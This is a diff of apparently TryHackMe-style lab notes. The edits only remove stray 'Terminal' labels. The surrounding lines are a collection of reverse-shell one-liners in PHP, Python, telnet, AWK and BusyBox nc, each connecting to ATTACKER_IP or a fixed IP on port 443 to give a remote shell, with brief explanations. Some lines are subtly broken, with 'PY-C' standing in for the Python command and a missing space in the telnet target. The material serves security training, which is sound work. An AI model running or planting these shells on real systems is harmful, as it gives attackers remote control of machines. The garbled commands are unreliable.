@@ -208,8 +208,6 @@ This reverse shell creates a socket connection to the attacker's IP on port `4
   
 
 **PHP Reverse Shell Using the shell_exec Function**
-
-T
 ```shell-session
 target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
 ```
@@ -219,9 +217,6 @@ Similar to the previous command, but uses the `shell_exec` function.
   
 
 **PHP Reverse Shell Using the system Function**
-
-Terminal
-
 ```shell-session
 target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
 ```
@@ -231,9 +226,6 @@ This reverse shell employs the `system` function, which executes the command 
   
 
 **PHP Reverse Shell Using the passthru Function**
-
-Terminal
-
 ```shell-session
 target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
 ```
@@ -243,9 +235,6 @@ The `passthru` function executes a command and sends raw output back to the br
   
 
 **PHP Reverse Shell Using the popen Function**
-
-Terminal
-
 ```shell-session
 target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
 ```
@@ -258,8 +247,6 @@ This reverse shell uses `popen` to open a process file pointer, allowing the 
 
 **Python Reverse Shell by Exporting Environment Variables**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
 ```
@@ -268,8 +255,6 @@ This reverse shell sets the remote host and port as environment variables, crea
 
 **Python Reverse Shell Using the subprocess Module**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
 ```
@@ -277,8 +262,6 @@ target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_
 This reverse shell uses the `subprocess` module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.  
 
 **Short Python Reverse Shell**
-
-Terminal
 
 ```shell-session
 PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
@@ -290,8 +273,6 @@ Others
 
 **Telnet**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
 ```
@@ -300,8 +281,6 @@ This reverse shell creates a named pipe using `mkfifo` and connects to the att
 
 **AWK**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -309,8 +288,6 @@ target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { d
 This reverse shell uses AWK’s built-in TCP capabilities to connect to `ATTACKER_IP:443`. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.
 
 **BusyBox**
-
-Terminal
 
 ```shell-session
 target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
